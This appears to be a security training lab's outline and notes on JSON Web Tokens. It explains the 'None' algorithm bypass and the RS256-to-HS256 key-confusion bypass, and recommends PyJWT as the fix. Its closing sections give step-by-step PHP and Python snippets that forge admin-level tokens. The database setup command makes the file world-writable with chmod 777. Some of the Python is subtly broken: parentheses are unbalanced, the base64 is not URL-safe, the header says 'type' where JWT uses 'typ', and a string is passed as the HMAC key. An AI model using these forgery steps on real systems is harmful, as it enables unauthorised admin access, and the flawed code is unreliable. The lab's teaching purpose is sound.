# Lab: JWT None Algorithm Bypass

JWT bypass two ways:

- Using the "None" algorithm for the header
- Shifting the alg over to use HMAC and public key as hash key (public keys are public)

## Title

The Key to Secure JSON Web Tokens

## Outline

I. Introduction to JSON Web Tokens
    a. What they are, what they can be used for
        - More context than just a session identifier
        - Avoiding sensitive data in claims
        - Sending them as headers

    b. How they're structured and created
        - built from JSON
        - header, claims, signature (link to more info about claims)
        - serialized, bas64 encoded (url safe)
        - signature generated by different algorithms
        - JWT aren't encrypted

II. Exploit #1: Bypass of validation with "None"

    a. Detail on the algorithms supported by category: None, HMAC, RSA
        - None means no signature checking, is a part of the spec
        - HMAC uses single secret key for generating signature hash
        - RSA uses public/private key for signature generation

    b. Updating a token to use None
        - Get current valid token
        - Decode it to determine the current claims and header
        - Modify the header to use `alg: None`
        - Recreate parts (header, claims, signature): base64_encode(json)
        - Signature doesn't matter, code doesn't validate it

    c. Problem is the control the user has over the algorithm used
        - Many libraries don't allow `None` as a valid `alg` option anymore

III. Exploit #2: Bypass of correct validation with `alg` change

    a. Similar to the "None issue
        - Involves a manual change to the algorithm
        - Can be used when the tokens use RSA for signature generation
        - Means shifting the `alg` value to HMAC instead of RSA

    b. Updating the token to move to HMAC
        - Change `alg` value in header to `HS256` instead of `RS256`
        - This causes the public key to be used as the HMAC secret
        - Public keys are public knowledge so are easy to find
        - Regenerate the signature using HMAC and the public key as the HMAC secret

    c. Again, problem is the control the user has over the algorithm
        - They don't choose the `alg` on generation, the app does
        - They can choose on decoding, dangerous if app chooses from the header
        - Most libraries will now enforce the definition of an `alg` and compare the header

IV. Fixing things by using a pre-existing library

    a. Not the only way to fix JWT use but better than roll-your-own
        - Library for Python: PyJWT
        - Libraries for other langauges: 
            > namshi/jose for PHP
            > firebase/php-jwt for PHP
            > jsrsasign for Javascript
            > org.bitbucket.b_c / jose4j / 0.6.3 for Java
            > jwt for Ruby
            > SermoDigital/jose for Go

    b. Using PyJWT to correct the issue
        - Make sure the PyJWT library is installed (`pip install pyjwt`)
        - Replace the current `jwtManager` with a new version
            make use of the library that was specifically updated to prevent the two issues

    c. The importance of using trusted tools


## Resources

- [JSON Web Token RFC](https://tools.ietf.org/html/rfc7519)
- [JWT.io](https://jwt.io/)
- [JSON Web Token Claims Registry](https://tools.ietf.org/html/rfc7519#section-10.1)
- [PyJWT library](https://pyjwt.readthedocs.io/en/latest/)
- [Auth0 JWT vulnerability article](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [namshi/jose](https://github.com/namshi/jose)
- [firebase/php-jwt](https://github.com/firebase/php-jwt)
- [jsrsasign](http://kjur.github.io/jsrsasign/)
- [org.bitbucket.b_c / jose4j / 0.6.3](https://bitbucket.org/b_c/jose4j)
- [jwt for Ruby](https://github.com/progrium/ruby-jwt)
- [SermoDigital/jose for Go](https://github.com/SermoDigital/jose)

## Setting up the database

```
python3 cli.py migrate -f; python3 cli.py db:seed -f; chown nobody /tmp/test.db; chmod 777 /tmp/test.db
```


## To perform the "None" bypass

1. Get the current token
2. Decode it at https://jwt.io to find the current claims values
3. Use the structure to create a "None" token

### PHP
```php
<?php
echo base64_encode('{"alg": "None", "type": "JWT"}');
echo base64_encode('{"claims": {"username": "user1", "level": "admin"}}');
?>
```

### Python (v3)
```python
import base64
print(base64.b64encode('{"alg": "None", "type": "JWT"}'.encode('utf-8')))
print(base64.b64encode('{"claims": {"username": "user1", "level": "admin"}}'.encode('utf-8')))
```

4. Profit!

## To perform the RSA/HMAC bypass

1. Get the current public key (freely available)
2. Change the algorithm to use 'HS256' so it will use HMAC
3. Generate the new token with signature using the public key as the HMAC key

### Python (v3)
```python
import json, base64, hashlib, hmac

pubkey = '...'
header = base64.b64encode('{"alg": "HS256", "type": "JWT"}'.encode('utf-8')))
payload = base64.b64encode('{"claims": {"username": "user1", "level": "admin"}}'.encode('utf-8')))

# And now the signature
message = '{}.{}'.format(header, payload).encode('utf-8')
signature = hmac.new(pubkey, message, hashlib.sha256).hexdigest()

token = [
    header.decode('utf-8'),
    payload.decode('utf-8'),
    signature
]
token = '.'.join(token)

print(token.encode('utf-8'))
```

4. Profit!
